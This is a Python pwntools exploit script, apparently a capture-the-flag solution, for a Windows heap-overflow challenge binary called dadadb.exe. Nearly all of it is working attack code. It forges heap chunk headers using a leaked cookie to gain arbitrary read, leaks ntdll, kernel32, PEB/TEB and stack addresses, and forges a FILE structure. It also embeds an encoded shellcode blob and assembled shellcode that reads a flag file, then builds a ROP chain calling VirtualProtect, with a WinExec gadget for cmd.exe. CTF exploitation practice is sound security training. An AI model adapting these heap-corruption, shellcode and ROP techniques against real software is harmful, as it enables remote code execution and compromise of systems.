from pwn import *
import time 
#context.log_level = "debug"
#p = remote("13.230.51.176", 4869)
#p = remote("127.0.0.1", 4869)
p = process("./dadadb.exe")

context.arch = "amd64"

def login(need = False, value = 0):

    if not need:
        p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("User:")
    p.sendline("ddaa")
    p.recvuntil("Password:")
    p.sendline("phdphd")
    if not need:
        p.recvuntil(">> ")
    else:
        p.sendline(value)
        time.sleep(1)
        p.interactive()
        
def Insert(key, size, data):

    p.sendline("1")
    p.recvuntil("Key:")
    p.sendline(key)
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.sendline(data)
    p.recvuntil(">> ")

def Leak(key):
    p.sendline("2")
    p.recvuntil("Key:")
    p.sendline(key)
    data = p.recvuntil(">> ")
    return data 

def Dele(key):

    p.sendline("3")
    p.recvuntil("Key:")
    p.sendline(key)
    data = p.recvuntil(">> ")

def logout():

    p.sendline("4")
    p.recvuntil(">> ")


def setparas(user, Password):

    p.sendline("1")
    p.recvuntil("User:")
    p.send(user)
    p.recvuntil("Password:")
    p.send(Password)
    p.recvuntil(">> ")
    

login()
Insert("b"*(0x40-1), 0x80, "aaaa") # pad

for i in range(10):
    Insert("a"*(0x40-2)+chr(i), 0x200, "say{:x}".format(i))


leakkey = "a"*(0x40-2)+chr(8)
Insert(leakkey, 0x100, "allocate me") #split 1/2: 0x200 chunk
data = Leak(leakkey)
temp = data.split("allocate me")[1]
temp = temp.strip("\0")
cookie = temp[:8]
heap1  = temp[8:16]
heap2  = temp[16:24]
cookieval = u64(cookie)
heap1val  = u64(heap1)
heap2val  = u64(heap2)

# print "cookie:" , hex(cookieval)
# print "heap1:", hex(heap1val)
# print "heap2:", hex(heap2val)
heapbase = heap2val - 0x150
realcookie = cookieval ^ 0x1110000010
print "heap:", hex(heapbase)
print "realcookie: ", hex(realcookie)


key2 = "t" * (0x40-2) + "a"
Insert(leakkey, 0x180, "afang") #split 1/2: 0x200 chunk
Insert(key2, 0x20, "showmaker") #Insert another one


c = p64(realcookie ^ 0x2000001909010008)

Insert(leakkey, 0x180, "a" * 0x180 + p64(0) + c + p64(heapbase+0x2c0).strip("\0"))


def readaddr(address, length):
    global c
    global leakkey
    global key2
    Insert(leakkey, 0x180, "a"*0x180 + p64(0) + c + p64(address) + p64(length).strip('\0'))
    data = Leak(key2)
    return data.strip("Data:").strip("\r\nddaa@db>> ")

#leak ntdll
ntdll_offset = u64(readaddr(heapbase+0x2c0, 8))
print hex(ntdll_offset)
ntdll_base = ntdll_offset - 0x163dd0 ## **NEEDFIXING
print "ntdll base:"
print hex(ntdll_base)
raw_input("check")

#leak PEB TEB
PEBTarget = ntdll_base + 0x165348 #PEB
PEBADDR = u64(readaddr(PEBTarget, 8))
print hex(PEBADDR)
TEBTARGET = PEBADDR - 0x80 + 0x1000
print hex(TEBTARGET)

#leak binary
BinTarget = ntdll_base + 0x17a500
image_addr = u64(readaddr(BinTarget, 8))
print hex(image_addr)

#leak kernel32
iat = image_addr + 0x3000
READFILE = u64(readaddr(iat, 8))
print hex(READFILE)
KERNEL32 = READFILE - 0x22410
print "kernel32:", hex(KERNEL32)
stacktarget = (TEBTARGET + 0x10 + 1) # current stack
stack = u64(readaddr(stacktarget, 8)) << 8
start = stack+0x2f00
target_ret = image_addr + 0x1e38
print "stack: ", hex(start)


main_ret_bundle = 0 
# read range 0x2000 from start to lower address
# searching target_ret 
found = False
valbundle = ""
for i in range(0x2000/0x40): 
    try:
        valbundle = readaddr(start-i*0x40, 0x40)
        print hex(start-i*0x40)
        print "search : %d" % i
        if p64(target_ret) in valbundle :
            print "found !"
            found = True
            main_ret_bundle = start - i*0x40 #return bundle start position
            break
    except :
        continue

if not found:
    print "Main return not found, please check"


print hex(main_ret_bundle)
main_ret = main_ret_bundle + valbundle.index(p64(target_ret))
# print stack
print readaddr(main_ret - 0x180 - 0x108, 0x40).encode("hex")
#raw_input("print stackval")

#deprecate, use another chunk for copy 0x62 onto position 

ZeroKey = "\0" * (0x40-2) + "a"
TriggerKey = "a"*(0x40-2)+chr(5)
Insert(TriggerKey, 0x180, "fight") #split 1/2: 0x200 chunk
Insert(ZeroKey, 0x20, "showmaker") #Insert another one
#Overwrite ZeroKey's Control to set a 0x62 on target position
checkcookie = realcookie ^ 0x2000001909010008
Insert(TriggerKey, 0x180, "a" * 0x180 + p64(0) + p64(checkcookie) + p64(heapbase + 0x2290) + p64(0x20) + ZeroKey + "\x00" + p64(0) + p64(0x62))


#Insert(leakkey, 0x180, "a" * 0x180 + p64(0) + c + p64(heapbase+0x750).strip("\0"))
#c2 = realcookie ^ 0x1908000008
# Insert("d"*(0x40-2)+"a", 0x400, "cccc")
# heapbase+0x1f60
val1 =  realcookie ^ 0x1000001103010002
val2 =  realcookie ^ 0x1000000203010002
#Insert(leakkey, 0x180, "a" * 0x180 + p64(0) + c + p64(heapbase+0x750) + p64(0x20) + key2 + "\0" + p64(0) + p64(0x62))
#raw_input("before del")
# release it!
# image_addr + 0x5668
#Dele(key2) # offset: 0x5990
#Insert(key2, 0x80,  "aaaa")


logout()
pay1 = "ddaa" + "\x00"*4 + p64(0) + p64(0) + p64(val1) # fixed header1
pay2 = "phdphd" + "\x00" *2 + p64(0) + p64(val2) + p64(0) # fixed header2
#raw_input('1')
setparas(pay1, pay2) #1

#Insert(leakkey, 0x180, "a" * 0x180 + p64(0) + p64(c2) + p64(heapbase+0x750).strip("\0"))
# reproduce key3

key3 = "\x01" * (0x40-2) + "a"
key4 = "\x11" * (0x40-2) + "a"

# fake IOFileStructure
fake_IOFILE = ""
ptr = (main_ret - 0x180 - 0x108 ) 
base = (main_ret - 0x180 - 0x108 ) # target 
cnt = 0
flag= 0x2049
fd = 0
pad = 0
bufsize = 0x400


obj =  p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(0)
obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2


overwritekey = "a"*(0x40-2)+chr(3)
Insert(overwritekey, 0x180, "shoot")  #split 1/2: 0x200 chunk
Insert(key3, 0x20, "showmaker2")


c3 = realcookie ^ 0x2000001909010008
Insert(overwritekey, 0x180, "a"*0x180 + p64(0)+p64(c3)+p64(heapbase+0x22c0) + p64(0x20) + key3 + "\0" + p64(0) + p64(val2))


Dele(key3)
Dele(ZeroKey)

key5 = "\x60" + (0x40-2) * "\x00"
key6 = "\x62" + (0x40-2) * "\x00"
key7 = "\x50" + (0x40-3) * "\x00"


overwritekey2 = "a"*(0x40-2)+chr(1)
Insert(overwritekey2, 0x180, "label")
Insert(key6, 0x20, "gogogo") # unnecessary
#raw_input("check this")
# 0x1000001106010007
c4 = realcookie ^ 0x2000001909010008


Insert(overwritekey2, 0x180, "a"*0x180 + p64(0) + p64(c4) + p64(heapbase+0x17e0) + p64(0x20) + key6 + "\0" + p64(0) + p64(image_addr + 0x5660))
Dele(key6)
Dele(key6)

# OverWrite finished.
#print readaddr(image_addr + 0x1159, 8)


#Insert("ffff", 0x200, "faker666" * 2 + obj) #
# Setting filebuffer here
Insert("ffff", 0x400, "cmd.exe\0" + "a"*8 + obj) # 0x22a0


#shellcode = "\x31\xc9\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xf6\x52\x5e\x31\xff\x53\x5f\x31\xc9\x51\x68\x78\x65\x63\x00\x68\x57\x69\x6e\x45\x89\xe1\x51\x53\xff\xd2\x31\xc9\x51\x68\x65\x73\x73\x00\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\xe1\x51\x57\x31\xff\x89\xc7\xff\xd6\x31\xf6\x50\x5e\x31\xc9\x51\x68\x65\x78\x65\x00\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x00\x51\xff\xd7\x6a\x00\xff\xd6\xff\xff\xff\xff\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00"

buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x9b\x51\xc8\xe7\xb5\x85\x6b"
buf += "\x5e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\x67\x19\x4b\x03\x45\x6d\xa7\x5e\x9b\x51\x89\xb6\xf4"
buf += "\xd5\x39\x0f\xcd\x19\xf9\x35\xd0\xcd\xe0\x0c\xfb\x19"
buf += "\x43\xb5\xad\xcd\xe0\x0c\xbb\x19\x43\x95\xe5\xcd\x64"
buf += "\xe9\xd1\x1b\x85\xd6\x7c\xcd\x5a\x9e\x37\x6d\xa9\x9b"
buf += "\xb7\xa9\x4b\x1f\x5a\x98\xc5\xa6\xb4\x44\x89\xb3\xc9"
buf += "\x10\x99\xaf\x3e\xd7\x4b\xd5\xd9\x6d\x80\xe6\x65\xe3"
buf += "\xea\x26\x83\x5a\xca\xe8\x30\xf7\x6b\x5e\x9b\xda\x48"
buf += "\x6f\xb5\x85\x6b\x16\x1e\x91\xbc\x80\xfd\x84\xbb\x0e"
buf += "\x10\x19\xd0\xa3\x3e\xc5\x4b\x17\x9a\x81\x2b\xb1\xfd"
buf += "\x7a\xa2\x1f\x10\x65\x40\xaf\xb4\x53\x26\x6f\x52\x19"
buf += "\xf9\x27\x19\xc4\xaa\x97\x96\x10\xc9\x26\x8d\x65\x1e"
buf += "\xaf\xd7\x52\x84\xc3\xbd\xc0\x52\x8f\xee\x89\x90\xa3"
buf += "\x3e\xc5\x4f\x17\x9a\x81\xae\xa6\x3e\x89\x23\x1a\x10"
buf += "\x11\xd4\xae\xb4\x55\x2a\xd5\x9f\xd9\x80\xe6\x65\xc4"
buf += "\x33\x1f\xc3\x0f\x91\xbd\xf4\xdd\x2a\x07\xda\x0b\x80"
buf += "\x64\x59\xa5\x2a\x0c\x64\xb1\x90\xa6\xec\xdf\x23\xd5"
buf += "\x89\xb8\x83\x18\x4a\x7a\x36\x17\x25\x26\xbb\xd5\xea"
buf += "\xb6\x59\x5e\x9b\x10\x9e\xae\x3c\x63\x23\xdf\x77\xf1"
buf += "\xc9\xe7\xb5\xcc\xe2\xbb\xd2\xed\xca\xe7\xb0\xbc\x44"
buf += "\x00\x8e\x3f\x89\xb3\xfc\x0c\x8f\x12\x12\xa0\x89\x5d"
buf += "\xf9\xf2\x4d\x59\x64\x84\x84\x6e\x5f\xed\x6a\x5f\x9b"
buf += "\x51\x91\xa6\x0f\xac\xeb\x35\x9b\xae\x1d\x8d\xbf\xc4"
buf += "\x35\x0e\xcb\x1c\xf9\x2e\xf8\xb4\xab\x16\x64\x91\x80"
buf += "\x6e\x77\xcd\x94\x9e\xd3\xd8\x09\xa6\x0f\x6f\x64\x81"
buf += "\x7b\xae\x1d\xaf\x3c\x42\x01\x4e\xda\x09\x84\x6e\x57"
buf += "\xcd\xe2\xa7\xda\xeb\x51\x42\xc1\xe4\x94\x8b\x1e\x91"
buf += "\xbc\xed\xfc\x7a\xa5\x2b\x7e\xb9\x5b\xe7\xb5\x85\x23"
buf += "\xdd\x77\x41\x80\x6e\x57\xc8\x5a\x97\xf1\x55\x89\xbf"
buf += "\xfd\x0c\x92\x1f\x21\x53\x11\x2f\xea\x7a\xbe\xdd\x63"
buf += "\x51\xb6\xb2\xfd\x06\xaf\x7e\xc5\xd8\x3e\x8d\xf5\xc4"
buf += "\x32\x36\x9b\x41\xc8\xe7\xf4\xdd\x23\xd7\x69\x19\xf9"
buf += "\x2e\xf4\x3f\x33\xfa\xc8\xb4\x37\x32\xfd\x0c\xa8\x17"
buf += "\x12\x96\x85\xd6\x7c\xcc\xe2\xae\xd3\xd8\x12\xaf\x3c"
buf += "\x7c\x2a\xe4\x99\x88\x00\xb8\x4a\x50\xe8\xa6\x9b\x2c"
buf += "\xe0\xbf\xf4\xd2\x32\x36\x9b\x11\xc8\xe7\xf4\xdd\x01"
buf += "\x5e\xc1\x10\x72\xec\x9a\x8a\x5b\xa1\x4e\x06\x91\xa6"
buf += "\x0f\xf0\x05\x13\xfa\xae\x1d\xae\x4a\x4b\x82\x62\x64"
buf += "\xae\x37\xaf\xb4\x46\x23\x77\x5d\x19\x4d\x11\xc0\x31"
buf += "\x2a\xa1\x7c\x09\xa2\xe7\xec\xcc\xac\x9c\x6b\xe4\x6a"
buf += "\xb1\x4a\x50\x6b\x5e"


# buf =  ""
# buf += "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
# buf += "\xef\xff\xff\xff\x48\xbb\xd3\x66\xca\xd2\xde\x16\x43"
# buf += "\x99\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
# buf += "\x2f\x2e\x49\x36\x2e\xfe\x83\x99\xd3\x66\x8b\x83\x9f"
# buf += "\x46\x11\xc8\x85\x2e\xfb\x00\xbb\x5e\xc8\xcb\xb3\x2e"
# buf += "\x41\x80\xc6\x5e\xc8\xcb\xf3\x2e\x41\xa0\x8e\x5e\x4c"
# buf += "\x2e\x99\x2c\x87\xe3\x17\x5e\x72\x59\x7f\x5a\xab\xae"
# buf += "\xdc\x3a\x63\xd8\x12\xaf\xc7\x93\xdf\xd7\xa1\x74\x81"
# buf += "\x27\x9b\x9a\x55\x44\x63\x12\x91\x5a\x82\xd3\x0e\x9d"
# buf += "\xc3\x11\xd3\x66\xca\x9a\x5b\xd6\x37\xfe\x9b\x67\x1a"
# buf += "\x82\x55\x5e\x5b\xdd\x58\x26\xea\x9b\xdf\xc6\xa0\xcf"
# buf += "\x9b\x99\x03\x93\x55\x22\xcb\xd1\xd2\xb0\x87\xe3\x17"
# buf += "\x5e\x72\x59\x7f\x27\x0b\x1b\xd3\x57\x42\x58\xeb\x86"
# buf += "\xbf\x23\x92\x15\x0f\xbd\xdb\x23\xf3\x03\xab\xce\x1b"
# buf += "\xdd\x58\x26\xee\x9b\xdf\xc6\x25\xd8\x58\x6a\x82\x96"
# buf += "\x55\x56\x5f\xd0\xd2\xb6\x8b\x59\xda\x9e\x0b\x98\x03"
# buf += "\x27\x92\x93\x86\x48\x1a\xc3\x92\x3e\x8b\x8b\x9f\x4c"
# buf += "\x0b\x1a\x3f\x46\x8b\x80\x21\xf6\x1b\xd8\x8a\x3c\x82"
# buf += "\x59\xcc\xff\x14\x66\x2c\x99\x97\x9a\x64\x17\x43\x99"
# buf += "\xd3\x66\xca\xd2\xde\x5e\xce\x14\xd2\x67\xca\xd2\x9f"
# buf += "\xac\x72\x12\xbc\xe1\x35\x07\x65\xe6\xf6\x3b\x85\x27"
# buf += "\x70\x74\x4b\xab\xde\x66\x06\x2e\x49\x16\xf6\x2a\x45"
# buf += "\xe5\xd9\xe6\x31\x32\xab\x13\xf8\xde\xc0\x14\xa5\xb8"
# buf += "\xde\x4f\x02\x10\x09\x99\x1f\xb1\xbf\x7a\x20\xb7\xb6"
# buf += "\x1e\xaf\xd2\xde\x16\x43\x99"

write_func = u64(readaddr(image_addr+0x31B8, 8))
fread_func = u64(readaddr(image_addr+0x3208, 8))
fopen_func = u64(readaddr(image_addr+0x31a8, 8))
print hex(write_func)
print hex(fread_func)
print hex(fopen_func)

#full
payload = "C:\\dadadb\\flag.txt" + "\0" * 14
payload += "r" + "\0" * 15

# # Prepare parameters
# payload = "flag.txt" + "\0"*8 # 0x10 4b60
# payload += "xt\0" + "\0"*13 # 4b70
# payload += "r" + "\0" * 15 # 0x10 4b80

bufferaddr = heapbase + 0x4b60

Insert("ssss", 0x400, payload)

#fopens
spayload =  "mov rcx, {};".format(bufferaddr + 0x30) #4b90 FD.
spayload += "mov rdx, {};".format(bufferaddr) # FileName
spayload += "mov r8, {};".format(heapbase + 0x4b80) # Mode
spayload += "mov r9, {};".format(fopen_func) # Fopen
spayload += "add rsp, 8;"
spayload += "call r9;"

#fread
spayload += "mov rcx, {};".format(heapbase + 0x4ba0) # Flag
spayload += "mov rdx, {};".format(0x100) # elementsize
spayload += "mov r8, {};".format(1) # chunksize
spayload += "mov rax, {};".format(bufferaddr+0x30) #FD pointer
spayload += "mov r9, [rax];" #FD
spayload += "mov rbx, {};".format(fread_func)
spayload += "call rbx;"

#write
spayload += "mov rcx, 1;"
spayload += "mov rdx, {};".format(heapbase + 0x4ba0) #flag!!!!!
spayload += "mov r8, 0x80;"
spayload += "mov r9, {};".format(write_func)
spayload += "call r9;"

# call mainfunc
spayload += "mov rbx, {};".format(image_addr + 0x1740) # Main
spayload += "call rbx;"
#print asm(spayload)

# buf = asm("") # Test WriteOut
# print buf


shellcode = asm(spayload)


Insert("kkkk", 0x400, "d3adbeef"*2 + shellcode) #0x4f80
# raw_input("check addrs before shellcode")

# Spray the file structure
for i in range(0x20):
    Insert(key7+chr(i) , 0x10, p64(0) + p64(heapbase + 0x22a0).strip("\x00"))


# viewme.
print "VIEW:"
FILEADDR = (u64(readaddr(image_addr + 0x5668, 8)))
print "FILEADDR: ", hex(FILEADDR)
FILEPTR = (u64(readaddr(FILEADDR, 8)))
print "FILEPTR: ", hex(FILEPTR)
STACKPOSITION = (u64(readaddr(FILEPTR, 8)))
print "STACKPOSIOTION: ", hex(STACKPOSITION)
STACKPOSITION2 = (u64(readaddr(FILEPTR+8, 8)))
print "STACKPOSIOTION2: ", hex(STACKPOSITION2)
STACKPOSITION3 = (u64(readaddr(FILEPTR+0x10, 8)))
print "STACKPOSIOTION3: ", hex(STACKPOSITION3)
STACKPOSITION4 = (u64(readaddr(FILEPTR+0x18, 8)))
print "STACKPOSIOTION4: ", hex(STACKPOSITION4)

print "HEAPBASE: ", hex(heapbase)
raw_input("Done, Now Perform ROP")
logout()


WinExec = KERNEL32 + 0x5e800
poprcxret = ntdll_base + 0x21597
cmdaddress = heapbase + 0xc50
poprdxret = ntdll_base + 0x8c4b7
rets = p64(image_addr + 0x1007)
addrsp = image_addr + 0x27c1
virtualProtect = KERNEL32 + 0x1AF90
shellcodeadddr = heapbase + 0x2310
popr8ret = ntdll_base + 0x4d73f
popr9ret = ntdll_base + 0x8c4b4
test2 = p64(image_addr + 0x1159) * 16
main = p64(image_addr + 0x1740) * 16

#testrop is ok to load shellcode
testrop = rets * 4 + p64(poprcxret) + p64(heapbase + 0x4f80 - 0xf80) + p64(poprdxret) + p64(0x2000) + p64(0) + p64(popr8ret) + p64(0x40) + p64(popr9ret) + p64(heapbase + 0x4f70) + p64(0) + p64(0) + p64(virtualProtect) + p64(heapbase + 0x4f80) + p64(0)


gadget = rets * 10 + p64(poprcxret) + p64(cmdaddress) + p64(poprdxret) + p64(1) + p64(0) + p64(WinExec)
# trigger input
print len(testrop) 
print hex(main_ret) 
payload = testrop 

login(True, testrop)

p.interactive() 